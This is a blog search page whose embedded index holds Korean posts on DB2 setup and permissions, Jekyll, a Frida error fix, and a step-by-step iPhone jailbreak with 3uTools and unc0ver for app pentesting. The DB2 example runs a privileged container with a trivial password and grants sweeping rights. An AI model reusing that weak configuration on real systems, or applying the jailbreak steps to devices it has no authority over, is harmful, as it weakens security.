<!DOCTYPE html>
<html class="no-js">
  <head>
	<meta charset="utf-8">
	<title>Search | mingzzi</title>
	<meta name="description" content="mingzzi's blog">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<!-- CSS -->
	<link rel="stylesheet" href="/assets/css/main.css">

	<!--Favicon-->
	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">

	<!-- Canonical -->
	<link rel="canonical" href="/search.html">

	<!-- RSS -->
	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />

	<!-- Font Awesome -->
	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

	<!-- Google Fonts -->
	
	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
	

	<!-- KaTeX -->
	
	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
	

	<!-- Google Analytics -->
	
	<script>
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

	ga('create', 'UA-130304424-1', 'auto');
	ga('send', 'pageview');
	</script>
	
</head>

  <header class="site-header">
	<div class="branding">
		
		<a href="/">
			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
		</a>
		
		<h1 class="site-title">
			<a href="/">mingzzi</a>
		</h1>
		<nav class="site-nav">
				<ul>
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
							<li>
								<a class="page-link" href="/about/">
									About
								</a>
							</li>
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
							<li>
								<a class="page-link" href="/tags.html">
									tags
								</a>
							</li>
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					
						
					

					<!-- Search bar -->
					
					<li>
					<form action="/search.html" method="get">
						<input type="text" id="search-box" name="query" placeholder="Search" class="">
						<button type="submit" class="">
							<i class="fa fa-fw fa-search"></i>
						</button>
					</form>
					</li>
					
				</ul>
		</nav>
	</div>

	<div class="site-category">
			<ul class='cat1'>
				<li><a href="/">Home</a></li>
				<li><a href="/">Pentesting</a>
					<ul>
						<li><a href="/Pentest/iOS">iOS</a></li>
						<li><a href="/Pentest/Android">Android</a></li>
						<li><a href="/Pentest/PWeb">Web</a></li>
					</ul>
				</li>

				<li><a href="/">Wargame</a>
					<ul>
						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
						<li><a href="/Wargame/XG">XSS Game</a></li>
					</ul>
				</li>

				<li><a href="/">CTF</a>
					<ul>
						<li><a href="/CTF/2018">2018</a></li>
						<li><a href="/CTF/2019">2019</a></li>
					</ul>
				</li>

				<li><a href="/">Error</a>
					<ul>
						<li><a href="/Error/Linux">Linux</a></li>
						<li><a href="/Error/Python">Python</a></li>
					</ul>
				</li>

				<li><a href="/">Development</a>
					<ul>
						<li><a href="/Develop/Database">Database</a></li>
						<li><a href="/Develop/Blog">Github Blog</a></li>
						<li><a href="/Develop/DWeb">Web</a></li>
						<li><a href="/Develop/Docker">Docker</a></li>
						<li><a href="/Develop/Basic">Basic</a></li>
					</ul>
				</li>
			</ul>
		</div>

</header>

  <body>
    <div class="content">
      <article >
  <header style="background-image: url('/')">
    <h1 class="title">Search</h1>
      
  </header>
  <section class="post-content"><div class="search">
    <div id="search-results"></div>
    <p id="not-found" style="display: none">
        No results found.
    </p>
</div>


<script>
  window.store = {
    
      "development-database-2020-01-07-database-db2-grant-html": {
        "title": "[Database-DB2] 새로운 User 생성 및 권한 부여하기",
        "tags": "database, DB2",
        "date": "January 7, 2020",
        "author": "",
        "category": "",
        "content": "이번엔 DB2에서 새로운 사용자를 생성하고, 해당 사용자에게 권한을 부여하는 방법에 대해 정리한다.사용한 환경을 다시 한번 적으면 다음과 같다.  Ubuntu 16.04 + Docker일단 DB2는 구조가 다른 RDBMS랑 다르다.다른 RDBMS에서는 DB 계정이 따로 있고 생성할 수 있지만, DB2에서는 OS 계정 == DB 계정이다.즉, 새로운 DB 계정을 생성하기 위해서는 OS 계정을 생성해야 한다.먼저 일반 계정이 필요할 경우, OS에서 root로 로그인 후 아래의 명령어를 입력 해 새로운 계정을 생성한다.# useradd [USERNAME]# passwd [USERNAME]그런데 만약 관리자 권한이 필요하다면, 해당 계정을 관리자 권한 그룹에 추가해야 하기 때문에 아래처럼 생성해야 한다.# useradd -u [UID] -g db2iadm1 -m -d /home/[USERNAME] [USERNAME]# passwd [USERNAME]  참고 : IBM Db2 데이터베이스 설치를 위한 그룹 및 사용자 ID 작성(Linux 및 Unix)계정 생성이 완료 된 후에는 이제 Docker의 Shell을 실행 시켜 db2inst1 계정으로 로그인 해 새로 생성한 사용자에게 권한을 부여한다.// Docker Shell 실행# docker exec -it db2 /bin/bash// db2inst1 계정으로 로그인# su - db2inst1// 권한 부여// Ex1# db2 grant connect on database to user [USERNAME]DB20000I  The SQL command completed successfully.// Ex2# db2 grant dbadm on database to user [USERNAME]DB20000I  The SQL command completed successfully.// Ex3# db2 grant ACCESSCTRL, BINDADD, CONNECT, CREATETAB, CREATE_EXTERNAL_ROUTINE, CREATE_NOT_FENCED_ROUTINE, CREATE_SECURE_OBJECT, DATAACCESS, DBADM, EXPLAIN, IMPLICIT_SCHEMA, LOAD, QUIESCE_CONNECT, SECADM, SQLADM, WLMADM on database to user [USERNAME] DB20000I  The SQL command completed successfully.위의 권한 리스트 중 필요한 것을 부여하면 된다.각 권한에 대한 간략한 설명은 아래와 같으며, 더욱 자세한 정보는 IBM 공식 홈페이지에서 확인할 수 있다.  ACCESSCTRL : 액세스 제어 권한 부여.  BINDADD : 패키지 작성을 위한 권한 부여.  CONNECT : 데이터베이스 액세스를 위한 권한  CREATETAB : 기본 테이블 작성을 위한 권한 부여.  CREATE_EXTERNAL_ROUTINE : 외부 루틴 등록 권한 부여.  CREATE_NOT_FENCED_ROUTINE : 데이터베이스 관리자의 프로세스에서 실행하는 * 루틴을 등록하기 위한 권한 부여.  CREATE_SECURE_OBJECT : 보안 트리거 및 보안 함수 작성 위한 권한 부여.  DATAACCESS : 데이터 액세스를 위한 권한 부여.  DBADM : 데이터베이스 관리자 권한 부여.  EXPLAIN : 명령문 Explain을 위한 권한 부여.  IMPLICIT_SCHEMA : 내재적인 스키마 작성을 위한 권한 부여.  LOAD : 데이터베이스에 로드하기 위한 권한 부여.  QUIESCE_CONNECT : Quiesce 상태에서 데이터베이스에 액세스 하기 위한 권한 부여.  SCEADM : 보안 관리자 권한 부여.  SQLADM : SQL문 실행을 관리하기 위한 권한 부여.  WLMADM : 워크로드 관리를 위한 권한 부여.여기까지 하면 권한 부여는 완료되지만 아무리 db2를 입력해도 아래와 같은 오류만 나온다.SQL1092N \"The requested command or operation failed because the user ID does not have the authority to perform the requested command or operation. User ID: \"\"때문에 .bash_profile에 3줄 정도를 추가해야 한다.먼저 새로 생성한 계정으로 로그인한다.# su - [USERNAME]이 후 해당 계정의 .bash_profile을 열어 아래의 3줄을 추가 해 준다.다른 계정의 .bash_profile을 수정하지 않도록 주의해야 한다. 자신의 .bash_profile의 위치는 /home/[USERNAME]/.bash_profile이다.# vi .bash_profileif [ -f /database/config/db2inst1/sqllib/db2profile ]; then. /database/config/db2inst1/sqllib/db2profilefi이 때, /database/config/db2inst1/sqllib/db2profile는 자신의 환경에서 db2profile의 경로를 찾아 적어주면 된다.  (참고) db2profile 찾는 명령어 : find / -name \"db2profile\" 2&gt; /dev/null그럼 수정 완료 한 .bash_profile의 내용은 다음과 같을 것이다.# .bash_profile# Get the aliases and functionsif [ -f ~/.bashrc ]; then\t. ~/.bashrcfiif [ -f /database/config/db2inst1/sqllib/db2profile ]; then. /database/config/db2inst1/sqllib/db2profilefi# User specific environment and startup programsPATH=$PATH:$HOME/.local/bin:$HOME/binexport PATH이 후, 아래와 같이 로그아웃 후 다시 해당 계정으로 로그인을 하면 db2를 사용할 수 있게 된다.# . .bash_profile# exit# su - [USERNAME]# db2(c) Copyright IBM Corporation 1993,2007Command Line Processor for DB2 Client 11.5.0.0You can issue database manager commands and SQL statements from the command prompt. For example:    db2 =&gt; connect to sample    db2 =&gt; bind sample.bndFor general help, type: ?.For command help, type: ? command, where command can bethe first few keywords of a database manager command. For example: ? CATALOG DATABASE for help on the CATALOG DATABASE command ? CATALOG          for help on all of the CATALOG commands.To exit db2 interactive mode, type QUIT at the command prompt. Outside interactive mode, all commands must be prefixed with 'db2'.To list the current command option settings, type LIST COMMAND OPTIONS.For more detailed help, refer to the Online Reference Manual.db2 =&gt;여담계정을 새로 생성하고 새로 데이터베이스와 테이블을 생성하고 나서 전체 테이블을 조회를 해 봤더니, 기존 계정(db2inst1)으로 생성 한 테이블은 보이지가 않았다.알고보니, DB2는 계정을 OS 계정으로 사용하고 있기 때문에 우리가 흔히 생각하는 Super Admin의 개념 없이 자신이 연결 한 데이터베이스만 접근할 수 있는 것 같다.즉, 아래와 같이 사용자 A가 DB_A 데이터베이스를 생성하고, DB_A에 연결하여 테이블 TB_A를 생성하고, 사용자 B가 DB_B 데이터베이스를 생성하고 DB_B에 연결하여 테이블 TB_B를 생성했다고 가정하자.  사용자 A : DB_A 생성 -&gt; TB_A 생성  사용자 B : DB_B 생성 -&gt; TB_B 생성이 때, 사용자 A가 DB_A에 연결하여 조회한다면, DB_B에 생성되어 있는 TB_B는 조회를 할 수 없다.같은 맥락으로 사용자 B가 DB_B에 연결했다면 DB_A에 있는 테이블은 조회할 수 없다.또한 사용자 A가 DB_B에 연결하여 TB_C를 생성했다 하더라도, 사용자 A가 DB_A에 연결되어 있다면 본인이 만든 테이블임에도 DB_B에 있는 TB_C는 조회할 수 없다.IBM DB2 9.7 버전 이상부터 OS 계정만 사용할 수 있게 되며 생긴 보안 패치라고 한다.",
        "url": "//development/database/2020/01/07/database-db2_grant.html"
      }
      ,
    
      "development-database-2020-01-06-database-db2-query-html": {
        "title": "[Database-DB2] DB2 Query 정리",
        "tags": "databse, db2",
        "date": "January 6, 2020",
        "author": "",
        "category": "",
        "content": "DB2의 데이터베이스 및 테이블을 생성하고, 데이터를 추출하는 쿼리는 다음과 같다.일단 DB2에서는 쿼리를 2가지 방법으로 실행할 수 있다.// 그냥 Shell에서 실행# db2 \"Query\"OR// Shell에서 db2 콘솔 실행# db2db2 =&gt; Query // db2 콘솔에서 쿼리 실행예를 들면 다음과 같다.# db2 \"select * from table;\"OR# db2db2 =&gt; select * from table;어느 방법이든 쿼리와 결과는 동일하기 때문에 편한 방식으로 사용하면 될 것 같다.  데이터베이스 생성create database DB_NAME  테이블 생성create table DB_NAME.TABLE_NAME(COL_1 char(30) not null, COL_2 varchar(100) not null);  insertinsert into DB_NAME.TABLE_NAME(COL_1, COL_2, ...) values('VAL1_1', 'VAL1_2', '...'), ('VAL1_1', 'VAL1_2', '...'), (...);  selectselect * from DB_NAME.TABLE_NAME where CONDITION;참고사항  where절 사용 시, 문자는 작은따옴표(‘)로 묶어야 하고, 조건은 대소문자를 구분한다.select * from table where col='CONDITION';이 때, ‘CONDITION’은 대소문자를 구분하기 때문에 col='condition'과 col='CONDITION'은 다른 결과를 얻는다.  전체 데이터베이스 리스트 출력list database directory  전체 테이블 리스트 확인select * from sysibm.systables;이 때, name 컬럼은 테이블 명, creator 컬럼은 데이터베이스 명이다. 따라서 아래와 같이 사용하면 특정 데이터베이스 내의 테이블 명만 추출할 수 있다.select name from sysibm.systables where creator='DB_NAME';  특정 개수만큼 selectselect * from TABLE_NAME fetch first NUM rows only;이렇게 하면 각 테이블의 첫 행부터 NUM개의 행을 select 한다. 만약 마지막 행부터 특정 개수의 행을 추출하고 싶다면, 특정 column을 기준으로 order by desc한 후 fetch first NUM rows only를 사용해야 한다.(IBM 공식 답변에 따르면 테이블의 마지막 행부터 특정 개수의 행을 추출하는 쿼리는 따로 만들어져 있지 않다고 함)",
        "url": "//development/database/2020/01/06/database-db2_query.html"
      }
      ,
    
      "development-github-20blog-2020-01-06-jekyll-local-blog-setting-html": {
        "title": "[Jekyll] Local에 Github Blog 세팅하기",
        "tags": "jekyll, github-blog",
        "date": "January 6, 2020",
        "author": "",
        "category": "",
        "content": "Github 블로그를 운영 중에 게시글이 많아지며 블로그 리뉴얼의 필요성을 느꼈다.테마를 싹 바꾸는 대대적인 작업이기 때문에 먼저 로컬에서 작업 후, 완성본을 Github에 push 하기로 했다.나는 Ubuntu 16.04 Server version에 세팅을 했다.설치를 해야하는 항목은 다음과 같다.  Nodejs  RubyGems  Ruby  gcc / g++ / make각각의 설치 방법은 다음과 같다.# apt-get install -y nodejs# apt-get install -y rubygems# apt-get install -y ruby# apt-get install -y ruby-dev# apt-get install -y gcc# apt-get install -y g++# apt-get install -y make이제 Jekyll을 설치해야 한다. 만약 gem install jekyll을 하면 jekyll 4.0.0이 설치되는데, 이 경우 해결해야 할 오류가 너무 많다. 그래서 나는 그냥 jekyll 3.8.5를 설치했다.# gem install jekyll -v 3.8.5# gem install bundler여기까지 하면 모든 준비가 완료된다.이제 내 Github에서 내 블로그 Repository를 Clone 한다.# git clone https://github.com/mingzz1/mingzz1.github.io.git# cd mingzz1.github.ioClone을 했으면 필요한 플러그인을 설치하고 serve를 해야 한다. (내 경우, Gemfile을 다 지워두었어서 원래 테마의 Github page에서 Gemfile과 Gemfile.lock를 가져왔다.)# bundle install만약 bundle install을 하는 동안 오류가 난다면, 해당 오류를 잘 읽어보면 된다.내 경우 아래와 같은 오류가 계속해서 발생했다.jekyll-4.0.0 requires ruby version &gt;= 2.4.0, which is incompatible with the current version, ruby 2.3.1p112이 경우, ruby 버전을 2.4 이상을 설치하거나 Gemfile 혹은 Gemfile.lock에서 jekyll 버전을 낮추면 된다.이 후 만약 아래의 오류가 발생한다면 bundle update jekyll을 하면 된다.Downloading jekyll-3.8.3 revealed dependencies not in the API or the lockfile (i18n (~&gt;0.7), jekyll-sass-converter (~&gt; 1.0), kramdown (~&gt; 1.14), rouge (&lt; 4, &gt;= 1.7)).Either installing with `--full-index` or running `bundle update jekyll` should fix theproblem.bundle install이 완료되었다면 이제 serve를 하면 된다.serve 시, 나는 Server version의 Ubuntu를 사용했기 때문에, 호스트에서 접속해야 해서, 따로 호스팅 주소를 넣어 주었다.이 주소는 해당 가상머신 혹은 서버의 IP 주소를 넣어주면 된다.# bundle exec jekyll serve -H 192.168.222.144웹 브라우저로 http://192.168.222.144:4000에 접속하면 내 블로그가 떠 있는 것을 확인할 수 있다.",
        "url": "//development/github%20blog/2020/01/06/jekyll-local_blog_setting.html"
      }
      ,
    
      "development-database-2020-01-05-database-db2-install-html": {
        "title": "[Database-DB2] Docker로 IBM DB2 설치하기",
        "tags": "database, db2, docker",
        "date": "January 5, 2020",
        "author": "",
        "category": "",
        "content": "회사에서 갑자기 DB2를 쓸 일이 생겼다.그래서 Docker를 사용 해 DB2를 설치하는 방법에 대해 정리한다.인터넷에 db2 install이라고 검색하면 다양한 환경이 나오는데, 주로 CentOS를 사용하는 결과가 제일 많았다.나는 아래의 블로그 글을 참고했기 때문에 Ubuntu 16.04 Desktop version을 사용 했다.https://medium.com/@shanikanishadhi1992/configure-database-postgresql-with-docker-and-use-postgresql-as-the-db-type-with-wso2-identity-a43e9cf7322a우선 Docker를 설치하기 위해 아래의 명령어를 순서대로 입력한다.ubuntu@ubuntu-virtual-machine:~$ sudo su[sudo] password for ubuntu:root@ubuntu-virtual-machine:/# curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -OKroot@ubuntu-virtual-machine:/# sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\"root@ubuntu-virtual-machine:/# apt-get updateroot@ubuntu-virtual-machine:/# apt-get install -y docker-ce설치가 끝난 후 systemctl status docker를 입력 했을 때 아래와 같이 나온다면 정상적으로 설치 된 것이다.root@ubuntu-virtual-machine:/# systemctl status docker● docker.service - Docker Application Container Engine   Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)   Active: active (running) since 일 2020-01-05 15:22:51 KST; 38s ago     Docs: https://docs.docker.com Main PID: 55386 (dockerd)    Tasks: 8   Memory: 38.0M      CPU: 499ms   CGroup: /system.slice/docker.service           └─55386 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock 1월 05 15:22:48 ubuntu-virtual-machine dockerd[55386]: time=\"2020-01-05T15:22:48.798686781+09: 1월 05 15:22:48 ubuntu-virtual-machine dockerd[55386]: time=\"2020-01-05T15:22:48.799017729+09: 1월 05 15:22:48 ubuntu-virtual-machine dockerd[55386]: time=\"2020-01-05T15:22:48.799238919+09: 1월 05 15:22:48 ubuntu-virtual-machine dockerd[55386]: time=\"2020-01-05T15:22:48.807393028+09: 1월 05 15:22:49 ubuntu-virtual-machine dockerd[55386]: time=\"2020-01-05T15:22:49.335870327+09: 1월 05 15:22:49 ubuntu-virtual-machine dockerd[55386]: time=\"2020-01-05T15:22:49.766653249+09: 1월 05 15:22:50 ubuntu-virtual-machine dockerd[55386]: time=\"2020-01-05T15:22:50.961242687+09: 1월 05 15:22:50 ubuntu-virtual-machine dockerd[55386]: time=\"2020-01-05T15:22:50.965732378+09: 1월 05 15:22:51 ubuntu-virtual-machine dockerd[55386]: time=\"2020-01-05T15:22:51.553494105+09: 1월 05 15:22:51 ubuntu-virtual-machine systemd[1]: Started Docker Application Container Enginelines 1-21/21 (END)이제, DB2를 설치 할 차례이다.별도로 Dockerfile을 통해 빌드하지 않아도 아래의 명령어를 통해 Docker run을 할 수 있다.root@ubuntu-virtual-machine:/# docker run -itd --name db2 --privileged=true -p 50000:50000 -e LICENSE=accept -e DB2INST1_PASSWORD=db2inst1 -e DBNAME=test -v /home/ubuntu/DB2:/database ibmcom/db2Unable to find image 'ibmcom/db2:latest' locallylatest: Pulling from ibmcom/db2ac9208207ada: Pull complete db3b974ae005: Pull complete 8b476cfca586: Pull complete a033f87212a0: Pull complete 6062ba253339: Pull complete 53d54ba98754: Pull complete 8113895a570d: Pull complete Digest: sha256:e7055e4ee436e3659fbaafdc8c7fe1088f79658ba851024da68ab4e181085f58Status: Downloaded newer image for ibmcom/db2:latesta2314a930cc8b44208b8053f9702df6285fe80416109dbba736a06a609c7289bDocker Container의 상태를 확인 해 보면 아래와 같을 것이다.root@ubuntu-virtual-machine:/# docker ps -aCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                          NAMESa2314a930cc8        ibmcom/db2          \"/var/db2_setup/lib/…\"   3 minutes ago       Up 3 minutes        22/tcp, 55000/tcp, 60006-60007/tcp, 0.0.0.0:50000-&gt;50000/tcp   db2이 후, 아래와 같이 입력하면 Container의 Shell을 실행시킬 수 있다.root@ubuntu-virtual-machine:/# docker exec -i -t db2 /bin/bash그 결과 아래와 같이 Container의 Shell로 변경된 것을 확인할 수 있다.DB2는 Shell의 계정과 DB2의 계정이 같아야 하는 것 같다.그래서 먼저 계정을 DB2의 계정인 db2inst1로 변경 해 주고 db2start 명령어를 통해 DB2를 실행시켜 주었다.[root@a2314a930cc8 /]# su - db2inst1Last login: Sun Jan  5 06:29:57 UTC 2020 on pts/0[db2inst1@a2314a930cc8 ~]$ db2start01/05/2020 06:33:49     0   0   SQL1026N  The database manager is already active.SQL1026N  The database manager is already active.데이터베이스를 생성하는 명령어는 create database [database명]이다.나는 test3이라는 데이터베이스를 생성 해 주고 해당 데이터베이스에 db2inst1 계정으로 연결을 해 주었다.[db2inst1@a2314a930cc8 ~]$ db2 create database test3DB20000I  The CREATE DATABASE command completed successfully.[db2inst1@a2314a930cc8 ~]$ db2 connect to test3 user db2inst1 using db2inst1   Database Connection Information Database server        = DB2/LINUXX8664 11.5.0.0 SQL authorization ID   = DB2INST1 Local database alias   = TEST3이 후 db2 [Query]의 형태로 쿼리를 실행시켜도 되지만, 그냥 db2만 입력 해 DB2 콘솔을 실행시킬 수 있다.list database directory는 MySQL에서의 show database와 동일하게, 데이터베이스의 목록을 출력 해 주는 명령어이다.[db2inst1@a2314a930cc8 ~]$ db2db2 =&gt; list database directory System Database Directory Number of entries in the directory = 2Database 1 entry: Database alias                       = TEST Database name                        = TEST Local database directory             = /database/data Database release level               = 15.00 Comment                              = Directory entry type                 = Indirect Catalog database partition number    = 0 Alternate server hostname            = Alternate server port number         =Database 2 entry: Database alias                       = TEST3 Database name                        = TEST3 Local database directory             = /database/data Database release level               = 15.00 Comment                              = Directory entry type                 = Indirect Catalog database partition number    = 0 Alternate server hostname            = Alternate server port number         =정상적으로 실행되는 것을 확인할 수 있다.",
        "url": "//development/database/2020/01/05/database-db2_install.html"
      }
      ,
    
      "error-python-2019-12-15-frida-error-html": {
        "title": "[Frida 오류] Frida - Failed to load the Frida native extension",
        "tags": "Error, Python",
        "date": "December 15, 2019",
        "author": "",
        "category": "",
        "content": "모바일 어플리케이션을 진단할 때 Frida는 거의 필수다.근데 이번에 새로 Frida를 설치했는데, 계속 Failed to load the Frida native extension 이라면서 오류가 나서 해결 방법을 적는다.오류 전체 메시지는 다음과 같다.&gt; frida-ps -U***Failed to load the Frida native extension: DLL load failed: 지정된 모듈을 찾을 수 없습니다.Please ensure that the extension was compiled for Python 3.x.***Traceback (most recent call last):  File \"C:\\Users\\ccoma\\AppData\\Local\\Programs\\Python\\Python36\\Scripts\\frida-ps-script.py\", line 11, in &lt;module&gt;    load_entry_point('frida-tools==5.3.0', 'console_scripts', 'frida-ps')()  File \"c:\\users\\ccoma\\appdata\\local\\programs\\python\\python36\\lib\\site-packages\\frida_tools\\ps.py\", line 6, in main    from frida_tools.application import ConsoleApplication  File \"c:\\users\\ccoma\\appdata\\local\\programs\\python\\python36\\lib\\site-packages\\frida_tools\\application.py\", line 20, in &lt;module&gt;    import frida  File \"c:\\users\\ccoma\\appdata\\local\\programs\\python\\python36\\lib\\site-packages\\frida\\__init__.py\", line 24, in &lt;module&gt;    raise ex  File \"c:\\users\\ccoma\\appdata\\local\\programs\\python\\python36\\lib\\site-packages\\frida\\__init__.py\", line 7, in &lt;module&gt;    import _fridaImportError: DLL load failed: 지정된 모듈을 찾을 수 없습니다.내가 사용한 Python의 버전은 3.6과 3.8이었는데, 둘 다에서 같은 오류가 났다.찾아보니 python 3.8에서는 아직 Frida를 지원하지 않는다고 하고, 3.6은 어느 순간부터 저런 오류 증상이 나타나는 것 같다.해결 방법은 python 3.7 버전 설치이다.Python 3.7.5위의 사이트에서 다시 3.7대 python을 설치하고 아래의 명령어를 통해 다시 frida를 재설치 하면 정상적으로 동작한다.&gt; pip install frida&gt; pip install frida-tools&gt; frida --version12.7.26",
        "url": "//error/python/2019/12/15/frida-error.html"
      }
      ,
    
      "pentesting-ios-2019-12-10-ios-jailbreak-html": {
        "title": "[iOS] 12.1.4 탈옥하기 (Without ignition, impactor)",
        "tags": "iOS, pen-testing",
        "date": "December 10, 2019",
        "author": "",
        "category": "",
        "content": "Android에서 루팅이 필요하듯이, iOS 앱 분석을 위해서는 탈옥이 필요하다.12.1.4 기준으로 Unc0ver만 폰에 설치할 수 있으면 그 뒤는 매우 쉽다.이 포스팅에서는 3uTools를 사용하여 Unc0ver를 설치하고 탈옥하는 방법을 정리한다.내가 사용 한 환경은 다음과 같다.  iPhone 7  iOS 12.1.4만약 탈옥을 하기 전에 iOS 최신 버전 업데이트 없이 초기화를 하고 싶은 경우 아래 포스팅을 확인 해 보면 된다.(초기화가 필수는 아니다.)iOS 초기화 방법일단 Unc0ver만 폰에 설치할 수 있으면 탈옥은 거의 끝난 것이다.Unc0ver 어플을 실행하고 버튼만 눌러주면 되기 때문이다.내가 Unc0ver 앱을 폰에 설치하기 위해서 시도했던 방법은 Impactor, Ignition, 3uTools 인데, 이 중 3uTools를 통해 탈옥을 성공할 수 있었다.Impactor와 Ignition은 삽질기(?)를 적을 예정이라, 진짜 탈옥 방법은 3. 3uTools 부터 확인하면 될 것 같다.1. Cydia Impactor아마 ios 12.1.4 탈옥 이렇게 검색하면 대부분 Cydia Impactor 에서 Impactor을 다운받아 Unc0ver을 폰에 넣는 방법을 알려 줄 것이다.그런데 오늘(2019.12.10) 기준으로 Impactor를 사용하면 아래와 같은 오류를 내며 더이상 진행이 불가능하다.+) 위의 오류가 안날 경우, 다른 블로그의 글 처럼 그대로 따라서 하면 된다.만약 Impactor에서 Itunes 계정으로 로그인하라고 나오는데, 패스워드가 계속 맞지 않는다고 하면 https://appleid.apple.com/에 접속 해 로그인을 하면 아래와 같은 페이지를 볼 수 있을 것이다.여기에서 빨간색 박스 안의 패스워드를 Impactor에 입력하면 다음 단계로 진행할 수 있다.인터넷에 찾아보니 저 오류는 애플의 정책이 바뀌어 나타나는 오류라고 한다.대략 한달 반 전 쯤 앱에 사인을 하는 방법이 바뀌어 그렇다는데, 당장 이 오류를 해결하는 방법은 없어보였다.Impactor를 사용하는 방법을 실패했으니 다른 방법을 찾아보았다.2. Ignition / tweakboxapp두 번째 방법으로는 폰의 사파리 앱을 통해 https://ignition.fun/이나 https://next.tweakboxapp.com/에 접속 해 Unc0ver를 다운받는 것이다.그런데 내 경우, 두 번째 사이트인 tweakboxapp은 Update CMP라는 빨간색 글씨만 뜨고 접속을 할 수 없었다.그래서 ignition에서 Unc0ver를 다운받으려 시도했었다.ignition에서 Unc0ver를 다운 받는 방법은 다음과 같다.홈페이지에서 Use Now를 누르고 하단의 돋보기를 눌러 검색을 한다.검색 창에 Unc0ver를 입력하면 2개의 파일이 나오는데 그 중 아래의 Unc0ver(official)을 선택하고 차례로 GET, Install을 클릭한다.이 후 홈 화면을 확인 해 보면 흰색 배경에 검정 선이 있는 어플이 하나 깔린다.원래는 위의 방법으로 바로 Unc0ver가 깔리고, 앱의 설정에서 신뢰할 수 있는 앱으로 설정 해 주면 된다는데, 나는 Unc0ver의 앱 아이콘부터 이상하게 나오고 설정을 아무리 뒤져도 기기관리 메뉴가 나타나질 않았다.(기기관리 메뉴는 예전에는 항상 있었지만 이제는 해당 메뉴가 필요한 경우에만 생성된다고 한다.)Ignition의 앱이 Revoke 되어 그렇다고 한다. (아마 tweakboxapp의 앱을 설치했다면  같은 증상이 나타날 것 같다.)3. 3uTools이렇게 앞의 두 과정을 모두 실패하고 한참 인터넷을 뒤지다가 찾은 마지막 방법은 3uTools(http://www.3u.com/)를 사용하는 것이다.위의 사이트에 접속해서 3uTools를 다운받고 실행하면 아래와 같다.Install을 눌러 설치하면 아래와 같이 화면이 뜰 것이다.화면에 나타난대로 아이폰과 PC를 연결하면 아래와 같이 내 폰의 상세한 정보가 나타난다.3uTools 상단을 살펴보면 메뉴가 있을텐데 여기서 Flash &amp; JB &gt; Jailbreak &gt; 버전선택 &gt; Run Jailbreak를 차례로 눌러준다.그럼 아래와 같이 프로세스가 진행된다.이제 OK를 누른 후 폰을 확인 해 보면 홈 화면에 Unc0ver가 설치 된 것을 확인할 수 있다.아마 앱을 바로 실행할 수는 없을 것이다.강제로 설치 한 앱이기 때문에 설정 &gt; 일반 &gt; 기기관리 &gt; Unc0ver 선택 및 신뢰 버튼 클릭을 해 주어야 앱을 실행할 수 있다.해당 앱을 실행하면 아래와 같다.만약 Cydia가 필요 없다면 여기서 바로 Jailbreak를 눌러 탈옥을 하면 된다.하지만 Frida 같은 툴을 설치하기 위해 Cydia가 필요하다면, 오른쪽 위 톱니바퀴를 눌러 탈옥 전 설정을 해 주어야 한다.설정 중 Reinstall Cydia를 체크 한 후 다시 첫 화면으로 돌아와 Jailbreak를 눌러주면 잠시 후에 아래와 같은 창이 뜨는데, 이 때 재시작을 하냐는 질문에 OK를 눌러주면 탈옥이 완료된다.재시작 후 화면을 확인 해 보면 Cydia 앱이 설치되어 있고 이를 통해 탈옥이 완료 된 것을 확인할 수 있다.여기까지 하면 탈옥은 완료된다.모의해킹을 하려면 몇 가지 더 설치해야 하지만 여기에 다 담기에는 내용이 너무 길어져 다른 포스팅으로 나누어 적을 예정이다.공장초기화를 해야하느냐 부터 Impactor 오류에, Ignition에서의 설치 실패까지 너무 험난했다ㅠㅠ 오전 시간 다 날림…이번에 이렇게 자세히 적어두었으니 다음엔 삽질 조금 적게 하길!",
        "url": "//pentesting/ios/2019/12/10/iOS-jailbreak.html"
      }
      ,
    
      "pentesting-ios-2019-12-10-ios-initialize-html": {
        "title": "[iOS] 아이폰 초기화 하기(iTunes 없이 / iOS 업데이트 없이)",
        "tags": "iOS, pen-testing",
        "date": "December 10, 2019",
        "author": "",
        "category": "",
